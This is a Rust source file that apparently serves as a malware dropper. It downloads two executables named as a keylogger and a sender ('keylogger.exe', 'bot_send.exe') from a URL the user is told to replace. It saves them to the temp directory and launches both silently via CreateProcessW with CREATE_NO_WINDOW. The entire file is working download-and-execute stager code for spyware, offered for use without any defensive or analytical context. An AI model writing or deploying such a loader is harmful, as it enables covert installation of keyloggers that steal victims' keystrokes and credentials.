use futures_util::StreamExt;
use tokio::fs::File;
use tokio::io::AsyncWriteExt;
use reqwest::Client;
use winapi::um::errhandlingapi::GetLastError;
use std::env::temp_dir;
use std::ptr::null_mut;
use winapi::um::processthreadsapi::{CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW};
use winapi::um::winbase::CREATE_NO_WINDOW;
use widestring::WideCString;

#[tokio::main]
async fn main() {

    // Replace your URL
    let url1 = "http://localhost/keylogger.exe";
    let url2 = "http://localhost/bot_send.exe";

    let temp_path1 = temp_dir().join("keylog.exe");
    let temp_path2 = temp_dir().join("keylog_sender.exe");

    let client = Client::new();

    let download1 = download_file(&client, url1, &temp_path1);
    let download2 = download_file(&client, url2, &temp_path2);

    let (result1, result2) = tokio::join!(download1, download2);

    match (&result1, &result2) {
        (Ok(_), Ok(_)) => {
            println!("Both filed Deployed successfully.");

            let execute1 = execute_file(&temp_path1);
            let execute2 = execute_file(&temp_path2);

            let (exec_result1, exec_result2) = tokio::join!(execute1, execute2);

            if exec_result1 && exec_result2 {
                println!("Both files executed in background.");
            } else {
                println!("Failed to execute one or both files in the background.");
            }
        }
        _ => {
            if let Err(e) = &result1 {
                println!("Failed to download file 1: {:?}", e);
            }
            if let Err(e) = &result2 {
                println!("Failed to download file 2: {:?}", e);
            }
        }
    }
}

async fn download_file(client: &Client, url: &str, path: &std::path::Path) -> Result<(), Box<dyn std::error::Error>> {
    let response = client.get(url).send().await?;

    if response.status().is_success() {
        let mut file = File::create(path).await?;

        let mut stream = response.bytes_stream();
        while let Some(chunk) = stream.next().await {
            let chunk = chunk?;
            file.write_all(&chunk).await?;
        }

        drop(file);
        Ok(())
    } else {
        Err(Box::new(std::io::Error::new(
            std::io::ErrorKind::Other,
            format!("Failed to download file: HTTP {}", response.status()),
        )))
    }
}

async fn execute_file(path: &std::path::Path) -> bool {
    let exe_path = WideCString::from_str(path.to_string_lossy()).unwrap();
    
    // let mut si = STARTUPINFOW {
    //     cb: std::mem::size_of::<STARTUPINFOW>() as u32,
    //     lpReserved: null_mut(),
    //     lpDesktop: null_mut(),
    //     lpTitle: null_mut(),
    //     dwX: 0,
    //     dwY: 0,
    //     dwXSize: 0,
    //     dwYSize: 0,
    //     dwXCountChars: 0,
    //     dwYCountChars: 0,
    //     dwFillAttribute: 0,
    //     dwFlags: 0,
    //     wShowWindow: 0,
    //     cbReserved2: 0,
    //     lpReserved2: null_mut(),
    //     hStdInput: null_mut(),
    //     hStdOutput: null_mut(),
    //     hStdError: null_mut(),
    // };

    // OR

    let mut si: STARTUPINFOW = unsafe{ std::mem::zeroed() };
    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;

    let mut pi = PROCESS_INFORMATION {
        hProcess: null_mut(),
        hThread: null_mut(),
        dwProcessId: 0,
        dwThreadId: 0,
    };

    let result = unsafe {
        CreateProcessW(
            null_mut(),
            exe_path.into_raw(),
            null_mut(),
            null_mut(),
            false as i32,
            CREATE_NO_WINDOW,
            null_mut(),
            null_mut(),
            &mut si,
            &mut pi,
        )
    };

    if result != 0 {
        true
    } else {
        let error_code = unsafe { GetLastError() };
        println!("Failed to execute file in the background. Error code: {}", error_code);
        false
    }
}
